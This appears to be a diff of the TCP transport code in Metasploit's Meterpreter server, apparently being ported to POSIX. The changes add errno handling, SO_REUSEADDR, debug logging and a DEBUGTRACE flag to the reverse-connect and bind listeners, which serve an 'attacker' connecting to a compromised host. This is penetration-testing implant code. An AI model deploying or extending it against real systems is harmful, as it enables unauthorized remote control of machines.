@@ -6,6 +6,8 @@
 #include <netdb.h>
 #include <netinet/in.h>
 
+#define DEBUGTRACE 1
+
 #define TRANSPORT_ID_OFFSET 22
 
 MetsrvConfigData global_config =
@@ -128,7 +130,7 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	struct addrinfo* addresses;
 	if (getaddrinfo(host, service, &hints, &addresses) != 0)
 	{
-		return WSAGetLastError();
+		return errno;
 	}
 
 	// prepare to connect to the attacker
@@ -137,7 +139,7 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	if (socketHandle == INVALID_SOCKET)
 	{
 		dprintf("[STAGELESS IPV6] failed to connect to attacker");
-		return WSAGetLastError();
+		return errno;
 	}
 
 	start = current_unix_timestamp();
@@ -171,7 +173,7 @@ static DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, 
 	closesocket(socketHandle);
 	freeaddrinfo(addresses);
 
-	return WSAGetLastError();
+	return errno;
 }
 
 /*!
@@ -189,26 +191,41 @@ static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int so
 
 	do
 	{
+    int yes = 1;
+    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) != 0)
+    {
+      dprintf("[BIND RUN] Failed to set sock opt: %u", errno);
+			result = errno;
+      break;
+    }
+
 		if (bind(listenSocket, sockAddr, sockAddrSize) == SOCKET_ERROR)
 		{
-			result = WSAGetLastError();
+      dprintf("[BIND RUN] Socket failed to bind: %u", errno);
+			result = errno;
 			break;
 		}
 
+    dprintf("[BIND RUN] Socket bound successfully");
+
 		if (listen(listenSocket, 1) == SOCKET_ERROR)
 		{
-			result = WSAGetLastError();
+			result = errno;
 			break;
 		}
+
+    dprintf("[BIND RUN] Listening ...");
 
 		// Setup, ready to go, now wait for the connection.
 		acceptSocket = accept(listenSocket, NULL, NULL);
 
 		if (acceptSocket == INVALID_SOCKET)
 		{
-			result = WSAGetLastError();
+			result = errno;
 			break;
 		}
+
+    dprintf("[BIND RUN] Valid socket accepted %u", acceptSocket);
 
 		*acceptSocketBuffer = acceptSocket;
 	} while (0);
@@ -224,41 +241,6 @@ static DWORD bind_tcp_run(SOCKET listenSocket, struct sockaddr* sockAddr, int so
  */
 DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 {
-#if 0
-	*socketBuffer = 0;
-
-	// prepare a connection listener for the attacker to connect to
-	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-	struct sockaddr_in sock = { 0 };
-	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
-	sock.sin_family = AF_INET;
-	sock.sin_port = htons(port);
-
-	if (bind(listenSocket, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
-	{
-		return WSAGetLastError();
-	}
-
-	if (listen(listenSocket, 1) == SOCKET_ERROR)
-	{
-		return WSAGetLastError();
-	}
-
-	// Setup, ready to go, now wait for the connection.
-	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
-
-	// don't bother listening for other connections
-	closesocket(listenSocket);
-
-	if (acceptSocket == INVALID_SOCKET)
-	{
-		return WSAGetLastError();
-	}
-
-	*socketBuffer = acceptSocket;
-	return ERROR_SUCCESS;
-#endif
 	*socketBuffer = 0;
 
 	// prepare a connection listener for the attacker to connect to, and we
@@ -701,7 +683,7 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 		// Windows socket handles are always multiples of 4 apart.
 		listenSocket = ctx->fd - i;
 
-		vdprintf("[STAGED] Checking socket fd %u", listenSocket);
+		dprintf("[STAGED] Checking socket fd %u", listenSocket);
 
 		BOOL isListening = FALSE;
 		int isListeningLen = sizeof(isListening);
@@ -738,7 +720,7 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 		{
 			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
 			{
-				vdprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
+				dprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
 				ctx->bound = TRUE;
 				break;
 			}
@@ -748,7 +730,7 @@ static void infer_staged_connection_type(TcpTransportContext* ctx, SOCKET sock)
 		{
 			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
 			{
-				vdprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
+				dprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
 				ctx->bound = TRUE;
 				break;
 			}
@@ -873,6 +855,9 @@ static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
 		infer_staged_connection_type(ctx, sock);
 	}
 
+  if (result != ERROR_SUCCESS) {
+    return FALSE;
+  }
 	// Do not allow the file descriptor to be inherited by child processes
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
